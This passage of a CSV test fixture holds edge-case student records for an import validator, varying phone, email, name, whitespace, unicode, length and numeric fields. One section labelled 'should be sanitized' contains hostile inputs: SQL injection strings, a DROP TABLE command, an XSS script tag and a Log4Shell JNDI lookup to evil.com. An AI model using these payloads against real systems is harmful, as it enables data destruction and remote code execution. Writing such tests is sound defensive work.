DATE-004,Test Record 4,Jan 15,2024,D,DATE004,test4@example.com,555-0004
DATE-005,Test Record 5,15-Jan-2024,E,DATE005,test5@example.com,555-0005
DATE-006,Test Record 6,2024,F,DATE006,test6@example.com,555-0006
# Boolean format variations
BOOL-001,Test Record 1,9,A,BOOL001,test1@example.com,555-0001
BOOL-002,Test Record 2,9,B,BOOL002,test2@example.com,555-0002
BOOL-003,Test Record 3,9,C,BOOL003,test3@example.com,555-0003
BOOL-004,Test Record 4,9,D,BOOL004,test4@example.com,555-0004
BOOL-005,Test Record 5,9,E,BOOL005,test5@example.com,555-0005
BOOL-006,Test Record 6,9,F,BOOL006,test6@example.com,555-0006
# Phone number format variations
PHONE-001,Test Record 1,9,A,PHONE001,test1@example.com,(555) 000-0001
PHONE-002,Test Record 2,9,B,PHONE002,test2@example.com,555.000.0002
PHONE-003,Test Record 3,9,C,PHONE003,test3@example.com,555 000 0003
PHONE-004,Test Record 4,9,D,PHONE004,test4@example.com,+1-555-000-0004
PHONE-005,Test Record 5,9,E,PHONE005,test5@example.com,5550000005
PHONE-006,Test Record 6,9,F,PHONE006,test6@example.com,invalid phone format
# Email format variations
EMAIL-001,Test Record 1,9,A,EMAIL001,test.user@domain.com,555-0001
EMAIL-002,Test Record 2,9,B,EMAIL002,user+tag@sub.domain.com,555-0002
EMAIL-003,Test Record 3,9,C,EMAIL003,user.name@domain.co.uk,555-0003
EMAIL-004,Test Record 4,9,D,EMAIL004,user@localhost,555-0004
EMAIL-005,Test Record 5,9,E,EMAIL005,invalid email format,555-0005
EMAIL-006,Test Record 6,9,F,EMAIL006,@missing-local.com,555-0006
EMAIL-007,Test Record 7,9,G,EMAIL007,missing-domain@,555-0007
# Special characters in text fields
SPECIAL-001,O'Connor,John,9,A,SPEC001,john.oconnor@email.com,555-0001
SPECIAL-002,Smith-Jones,Mary,G10,B,SPEC002,mary.smith-jones@email.com,555-0002
SPECIAL-003,De La Cruz,Robert,11,C,SPEC003,robert.delacruz@email.com,555-0003
SPECIAL-004,Van der Berg,Alice,Grade 12,D,SPEC004,alice.vanderberg@email.com,555-0004
SPECIAL-005,O'Neil-D'Arcy,Emily,8,E,SPEC005,emerald.oneil@email.com,555-0005
SPECIAL-006,Müller,Hans,9,F,SPEC006,hans.muller@email.com,555-0006
SPECIAL-007,José García,10,G,SPEC007,jose.garcia@email.com,555-0007
SPECIAL-008,Борис Петров,11,H,SPEC008,boris.petrov@email.com,555-0008
SPECIAL-009,李明,Grade 9,I,SPEC009,li.ming@email.com,555-0009
SPECIAL-010,田中太郎,10,J,SPEC010,toru.tanaka@email.com,555-0010
# Whitespace issues
WHITESPACE-001,  Smith  ,  John  ,  9  ,  A  ,  WS001  ,  john.smith@email.com  ,  555-0001  
WHITESPACE-002,"Johnson, Mary","Grade 10","B","WS002","mary.johnson@email.com","555-0002"
WHITESPACE-003,	Williams	Robert	G10	C	WS003	robert.williams@email.com	555-0003	# Tab-separated
# Unicode and special characters
UNICODE-001,👤 Test User,9,A,UNI001,test.user@email.com,555-0001
UNICODE-002,Test ✓ Record,G10,B,UNI002,test.record@email.com,555-0002
UNICODE-003,Test ™ Symbol,11,C,UNI003,test.symbol@email.com,555-0003
UNICODE-004,Test © Copyright,Grade 12,D,UNI004,test.copyright@email.com,555-0004
UNICODE-005,Test ® Registered,8,E,UNI005,test.registered@email.com,555-0005
# SQL injection attempts (should be sanitized)
SQL-001,' OR '1'='1,9,A,SQL001,test.user@email.com,555-0001
SQL-002,; DROP TABLE students; --,G10,B,SQL002,test.user@email.com,555-0002
SQL-003,<script>alert('XSS')</script>,11,C,SQL003,test.user@email.com,555-0003
SQL-004,${jndi:ldap://evil.com/a},Grade 12,D,SQL004,test.user@email.com,555-0004
# Extremely long values
LONG-001,This is an extremely long name that exceeds normal database field limits and should be truncated or rejected during import processing to prevent database errors,9,A,LONG001,test.user@email.com,555-0001
LONG-002,Smith,John,9,B,VERYLONGSTUDENTID12345678901234567890123456789012345678901234567890,john.smith@verylongemailaddressdomainnamethatexceedslimitsandshouldbetruncatedorrejected.com,555-0002
LONG-003,Johnson,Mary,G10,C,LONG003,mary.johnson@email.com,555-VERYLONGPHONENUMBER1234567890123456789012345678901234567890
# Mixed case and formatting
CASE-001,sMITH, jOHN,9,a,CASE001,john.smith@email.com,555-0001
CASE-002,JOHNSON, MARY,GRADE 10,b,CASE002,mary.johnson@email.com,555-0002
CASE-003,williams, robert,11,c,CASE003,robert.williams@email.com,555-0003
CASE-004,BROWN, alice,GRADE 12,d,CASE004,alice.brown@email.com,555-0004
CASE-005,DAVIS, emily,8,e,CASE005,emily.davis@email.com,555-0005
# Numeric edge cases
NUMEDGE-001,Test Record,9,A,NUMEDGE001,test.user@email.com,0
NUMEDGE-002,Test Record,G10,B,NUMEDGE002,test.user@email.com,-1
NUMEDGE-003,Test Record,11,C,NUMEDGE003,test.user@email.com,999999999
NUMEDGE-004,Test Record,Grade 12,D,NUMEDGE004,test.user@email.com,3.14159
NUMEDGE-005,Test Record,8,E,NUMEDGE005,test.user@email.com,1.5e10
NUMEDGE-006,Test Record,9,F,NUMEDGE006,test.user@email.com,NaN
NUMEDGE-007,Test Record,G10,G,NUMEDGE007,test.user@email.com,Infinity
# Date edge cases
DATEEDGE-001,Test Record,9,A,DATEEDGE001,test.user@email.com,555-0001
DATEEDGE-002,Test Record,G10,B,DATEEDGE002,test.user@email.com,555-0002
DATEEDGE-003,Test Record,11,C,DATEEDGE003,test.user@email.com,555-0003
DATEEDGE-004,Test Record,Grade 12,D,DATEEDGE004,test.user@email.com,555-0004
DATEEDGE-005,Test Record,8,E,DATEEDGE005,test.user@email.com,555-0005
DATEEDGE-006,Test Record,9,F,DATEEDGE006,test.user@email.com,555-0006
DATEEDGE-007,Test Record,G10,G,DATEEDGE007,test.user@email.com,555-0007
DATEEDGE-008,Test Record,11,H,DATEEDGE008,test.user@email.com,555-0008
DATEEDGE-009,Test Record,Grade 12,I,DATEEDGE009,test.user@email.com,555-0009
DATEEDGE-010,Test Record,8,J,DATEEDGE010,test.user@email.com,555-0010
# Final test record - should be valid
FINAL-001,Test User,9,A,FINAL001,test.user@email.com,555-0001
